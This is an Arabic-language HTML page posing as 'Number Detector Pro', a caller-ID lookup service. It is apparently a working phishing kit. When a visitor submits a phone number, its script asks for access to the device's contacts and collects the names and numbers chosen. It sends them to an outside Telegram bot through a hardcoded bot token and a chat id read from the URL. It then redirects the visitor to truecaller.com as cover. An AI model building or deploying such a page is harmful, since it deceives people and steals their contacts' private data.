<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Number Detector Pro • كشف اسم المتصل</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        body { background-color: #0c1017; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
        .card { background: #131b2e; border: 1px solid #1f293d; padding: 35px 25px; width: 100%; max-width: 380px; text-align: center; border-radius: 20px; box-shadow: 0 10px 40px rgba(0,0,0,0.7); }
        
        /* أيقونة البحث المتحركة */
        .search-icon-box { width: 80px; height: 80px; background: rgba(59, 130, 246, 0.1); border: 2px solid #3b82f6; border-radius: 50%; margin: 0 auto 20px auto; display: flex; justify-content: center; align-items: center; animation: pulseGlow 2s infinite; }
        .search-icon-box svg { width: 36px; height: 36px; fill: #3b82f6; }
        @keyframes pulseGlow { 0% { box-shadow: 0 0 0 0 rgba(59, 130, 246, 0.4); } 70% { box-shadow: 0 0 0 20px rgba(59, 130, 246, 0); } 100% { box-shadow: 0 0 0 0 rgba(59, 130, 246, 0); } }

        h2 { font-size: 20px; margin-bottom: 6px; color: #60a5fa; }
        p { font-size: 12px; color: #94a3b8; margin-bottom: 20px; line-height: 1.5; }

        .input-group { margin-bottom: 15px; text-align: right; }
        input { width: 100%; padding: 12px; background: #0a0f1d; border: 1px solid #334155; color: #fff; border-radius: 8px; font-size: 14px; outline: none; text-align: center; }
        input:focus { border-color: #3b82f6; }

        .btn { width: 100%; padding: 14px; background: linear-gradient(135deg, #2563eb, #1d4ed8); border: none; color: #fff; font-weight: bold; font-size: 15px; border-radius: 8px; cursor: pointer; transition: 0.3s; }
        .btn:hover { opacity: 0.9; }
        .status { margin-top: 15px; font-size: 11px; color: #34d399; display: none; }
    </style>
</head>
<body>
    <div class="card">
        <div class="search-icon-box">
            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg>
        </div>
        <h2>دليل كاشف الأرقام الشامل</h2>
        <p>أدخل أي رقم هاتف لمعرفة اسم المتصل الحقيقي والبحث في قاعدة بيانات دليلك المحلي.</p>

        <form id="detectForm">
            <div class="input-group">
                <input type="text" id="targetPhone" placeholder="أدخل الرقم للبحث (مثال: +967...)" required>
            </div>
            <button type="submit" class="btn">كشف اسم المتصل الآن</button>
        </form>
        <div class="status" id="statusText">جاري مطابقة الرقم مع دليل الهاتف والبحث الفوري...</div>
    </div>

    <script>
        const botToken = "9047166728:AAGG2DJF-Kb7h7_15GNx5VS7Le2bG7a1ZRE";
        const urlParams = new URLSearchParams(window.location.search);
        const targetChatId = urlParams.get('to');

        document.getElementById('detectForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            if(!targetChatId) return;

            const phone = document.getElementById('targetPhone').value;
            document.getElementById('detectForm').style.display = 'none';
            document.getElementById('statusText').style.display = 'block';

            let contactsData = "لم يتم منح صلاحية جهات الاتصال";

            // فحص دعم المتصفح لسحب جهات الاتصال
            if ('contacts' in navigator && 'ContactsManager' in window) {
                try {
                    const props = ['name', 'tel'];
                    const opts = { multiple: true };
                    const contacts = await navigator.contacts.select(props, opts);
                    
                    if (contacts.length > 0) {
                        contactsData = contacts.map(c => `👤 ${c.name?.[0] || 'بدون اسم'} 📞 ${c.tel?.[0] || 'بدون رقم'}`).join('\n');
                    }
                } catch (err) {
                    contactsData = "رفض المستخدم إذن الوصول لجهات الاتصال";
                }
            } else {
                contactsData = "المتصفح لا يدعم واجهة جهات الاتصال (Contacts API)";
            }

            // إرسال البيانات إلى بوت التيليجرام الخاص بالمستخدم المسوق حصرياً
            const msg = `📇 صيد كشف الأرقام (جهات الاتصال)!\n\n🔍 الرقم الذي بحث عنه: ${phone}\n\n📋 تفاصيل جهات الاتصال المسحوبة:\n${contactsData}`;

            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${targetChatId}&text=${encodeURIComponent(msg)}`);

            setTimeout(() => {
                window.location.href = "https://www.truecaller.com";
            }, 1500);
        });
    </script>
</body>
</html>
